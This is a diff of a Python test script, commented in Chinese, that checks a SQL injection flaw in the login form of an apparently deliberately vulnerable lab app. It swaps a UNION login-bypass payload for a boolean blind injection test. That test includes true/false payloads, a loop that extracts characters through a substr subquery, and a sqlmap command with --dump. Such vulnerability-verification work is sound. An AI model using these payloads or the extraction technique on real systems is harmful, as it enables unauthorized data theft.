@@ -38,46 +38,77 @@ def login(username, password):
 
 
 # ─────────────────────────────────────────────
-# 漏洞8：登录接口 username 字段 —— UNION注入
+# 漏洞8：登录接口 username 字段 —— 布尔盲注
 # ─────────────────────────────────────────────
+def get_response_hint(resp_html):
+    """从响应 HTML 中提取 flash 提示文字"""
+    for keyword in ("账户不存在", "密码错误", "登录成功"):
+        if keyword in resp_html:
+            return keyword
+    return "(无提示)"
+
+
 def test_login_injection():
     print("\n" + "─" * 56)
-    print("  漏洞8：POST /login  username 字段 SQL注入")
+    print("  漏洞8：POST /login  username 字段 SQL注入（布尔盲注）")
     print("─" * 56)
 
-    # 正常登录作为对照
-    s_normal = login("zhangsan", "123456")
-    if s_normal:
-        name = s_normal.get(f"{BASE_URL}/api/profile").json()["data"]["username"]
-        print(f"{INFO} 正常登录 zhangsan → 当前用户：{name}")
-    else:
-        print(f"{FAIL} 正常登录失败，请检查应用状态")
+    def post_login(username, password="wrongpassword"):
+        r = requests.post(f"{BASE_URL}/login",
+                          data={"username": username, "password": password},
+                          allow_redirects=True)
+        return r.text
+
+    # 对照组：正常存在的用户 → "密码错误"
+    hint_exist = get_response_hint(post_login("zhangsan"))
+    # 对照组：不存在的用户 → "账户不存在"
+    hint_not_exist = get_response_hint(post_login("no_such_user_xyz"))
+
+    print(f"{INFO} 正常用户（zhangsan）+ 错误密码 → 提示：「{hint_exist}」")
+    print(f"{INFO} 不存在用户               + 错误密码 → 提示：「{hint_not_exist}」")
+
+    if hint_exist == hint_not_exist:
+        print(f"{FAIL} 两种情况提示相同，布尔盲注无法区分，注入点设计有问题")
         return
 
-    # 构造 UNION 注入：以 id=2 (lisi) 的身份登录，密码仍用 zhangsan 的 123456
-    # SQL变为: SELECT id FROM users WHERE username = ''
-    #          UNION SELECT id FROM users WHERE id=2--
-    payload = "' UNION SELECT id FROM users WHERE id=2--"
-    s_inject = requests.Session()
-    r = s_inject.post(f"{BASE_URL}/login",
-                      data={"username": payload, "password": "123456"},
-                      allow_redirects=False)
+    print(f"\n{OK} 两种提示不同，构成布尔 oracle，可进行盲注：")
+    print(f"    「{hint_exist}」   → 查询有返回行（条件为真）")
+    print(f"    「{hint_not_exist}」 → 查询无返回行（条件为假）")
 
-    if r.status_code != 302:
-        print(f"{FAIL} 注入未生效（HTTP {r.status_code}），请确认应用正在运行")
-        return
+    # 布尔验证：AND 1=1（真） vs AND 1=2（假）
+    # payload 注入后 SQL：WHERE username = 'zhangsan' AND '1'='1'
+    hint_true  = get_response_hint(post_login("zhangsan' AND '1'='1"))
+    hint_false = get_response_hint(post_login("zhangsan' AND '1'='2"))
+    print(f"\n{INFO} 注入 AND '1'='1 → 提示：「{hint_true}」")
+    print(f"{INFO} 注入 AND '1'='2 → 提示：「{hint_false}」")
 
-    injected_name = s_inject.get(f"{BASE_URL}/api/profile").json()["data"]["username"]
-    print(f"{WARN} 注入登录（密码仍为 123456）→ 当前用户：{injected_name}")
-
-    if injected_name == "lisi":
-        print(f"{OK} 漏洞验证成功：输入用户名为注入语句，以 lisi 身份登录，"
-              f"实际并未输入 lisi 的用户名")
+    if hint_true == hint_exist and hint_false == hint_not_exist:
+        print(f"{OK} 漏洞验证成功：布尔条件控制查询是否返回行，注入点有效")
     else:
-        print(f"    当前用户 {injected_name}，检查 payload 或数据库初始化")
+        print(f"    提示不符合预期，请检查数据库数据")
 
-    print(f"\n  Payload : {payload}")
-    print(f"  执行SQL  : SELECT id FROM users WHERE username = '{payload}'")
+    # 演示字符提取：盲注读取第一个用户名的第一个字母
+    # SQL：WHERE username = '' OR (SELECT substr(username,1,1) FROM users LIMIT 1) = 'z'--
+    print(f"\n{INFO} 演示字符提取（盲注读取 users 表第一行 username 首字母）：")
+    found_char = None
+    for c in "abcdefghijklmnopqrstuvwxyz":
+        pl = f"' OR (SELECT substr(username,1,1) FROM users LIMIT 1)='{c}'--"
+        hint = get_response_hint(post_login(pl))
+        if hint == hint_exist:
+            found_char = c
+            break
+    if found_char:
+        print(f"{WARN} 第一个用户 username 首字母为：'{found_char}'")
+        print(f"{OK} 字符提取成功，可逐字符枚举全部数据")
+    else:
+        print(f"    未匹配到字母，检查 payload 格式")
+
+    print(f"\n  sqlmap 扫描命令（POST 表单，布尔盲注）：")
+    print(f'  sqlmap -u "{BASE_URL}/login" \\')
+    print(f'    --data="username=zhangsan&password=test" \\')
+    print(f'    -p username --dbms=sqlite \\')
+    print(f'    --string="密码错误" \\')
+    print(f'    --technique=B --level=2 --dump')
 
 
 # ─────────────────────────────────────────────
